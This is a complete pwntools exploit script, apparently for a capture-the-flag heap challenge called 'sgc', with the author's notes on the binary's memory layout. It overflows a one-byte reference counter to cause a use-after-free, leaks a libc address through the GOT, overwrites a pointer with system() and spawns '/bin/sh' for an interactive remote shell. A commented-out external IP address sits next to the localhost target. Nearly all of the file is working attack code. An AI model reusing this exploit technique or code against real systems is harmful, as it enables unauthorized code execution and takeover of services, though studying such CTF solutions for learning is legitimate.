#!/usr/bin/python

from pwn import *
from time import sleep

def consumeMenu(p):
  p.recvuntil("Action: ")

def addUser(name, group, age, p):
  p.sendline("0")
  p.sendlineafter("name: ", name)
  p.sendlineafter("group: ", group)
  p.sendlineafter("age: ", str(age))
  consumeMenu(p)  

def displayGroup(group, p):
  p.sendline("1")
  p.sendlineafter("name: ", group)
  ret = p.recvuntil("0: Add a user")
  log.info(ret)
  consumeMenu(p)

def displayUser(index, p):
  p.sendline("2")
  p.sendlineafter("index: ", str(index))
  ret = p.recvuntil("0: Add a user")
  consumeMenu(p)
  return ret

def editUser(index, group, prop, p):
  p.sendline("3")
  p.sendlineafter("index: ", str(index))
  p.sendlineafter("group(y/n): ", prop)
  p.sendlineafter("name: ", group)
  consumeMenu(p)

def editUserWithProp(index, group, p):
  editUser(index, group, "y", p)

def editUserNoProp(index, group, p):
  editUser(index, group, "n", p)

def deleteUser(index, p):
  p.sendline("4")
  p.sendlineafter("index: ", str(index))
  consumeMenu(p)

def leakPointer(p):
  leak = displayUser(3, p)
  start = leak.find("Group: ")+len("Group: ")
  end = start + leak[start:].find("\n")
  heapAddr = u64(leak[start:end].ljust(8, "\x00"))
  log.info("addr: {}".format(hex(heapAddr)))
  return heapAddr

def overflowRefCount(p):
  sleep(2)
  s = log.progress("Overflowing ref-count")
  for i in range(255):
    addUser("AAA", "BBB", 33, p)
    editUserNoProp(0, "CCC", p)
    deleteUser(0, p)
    s.status(str(i)+"/255")
  s.success("Ready") 

def leakGotAddr(gotAddr, p):
  editUserWithProp(1, flat(p64(0), p64(gotAddr), p64(gotAddr)), p)
  addr = leakPointer(p)
  return addr

if __name__ == "__main__":
  print("lets go")
  #p = process("./sgc")
  #host, port = "35.198.176.224", 1337
  host, port = "localhost", 1337 
  p = remote(host, port)

  e = ELF("./sgc")
  #libc = e.libc
  libc = ELF("libc-2.26.so")

  gdbcmd = []

  gdbcmd.append("c")

  gdbcmd = "\n".join(gdbcmd)
  #gdb.attach(p, gdbcmd)

  overflowRefCount(p)

  sleep(1)
  
  addUser("A"*31, "iDDD", 44, p)
  addUser("A"*31, "BBB", 44, p)

  sleep(0.1)

  addUser("A"*31, "iDDD", 44, p)
  addUser("A"*31, "iDDD", 44, p)

  #edit 1 will will overwrite index 3
  #editUserWithProp(1, "A"*24, p)

  freeAddr = leakGotAddr(e.got["strlen"], p)
  libcBase = freeAddr - libc.symbols["strlen"]
  systemAddr = libc.symbols["system"] + libcBase

  editUserWithProp(3, p64(systemAddr), p)

  p.sendline("0")
  p.sendlineafter("name: ", "/bin/sh")
  p.sendlineafter("group: ", "AAA")
  p.sendlineafter("age: ", "1")

  p.interactive()

'''
Run:
socat tcp-listen:1337,fork,reuseaddr system:"ltrace -f -e malloc+free-@libc.so*  ./sgc"

to debug malloc and free calls and addrs

Notes:

userlist addr: 0x6020e0
grouplist addr: 0x6023e0

Alloc Group

Group {
  char* name_ptr; // 24 bytes
  unsigned char refCount
}

User {
  unsigned int age;
  char* name_ptr; // at most 192 bytes
  char* grp_name_ptr; 
}

Group and Group.name_ptr are freed by GC

User is freed on delete - user.name_ptr is leaked

add user:
malloc user struct
malloc user name string
set string in struct

create group:
malloc group name string
malloc group struct
set string in struct

---------------

create 255 users in groupA and move to groupB and delete user

next userA in groupA will overflow refcount and free the group

userA will have a pointer to free memory (groupA)


'''
  
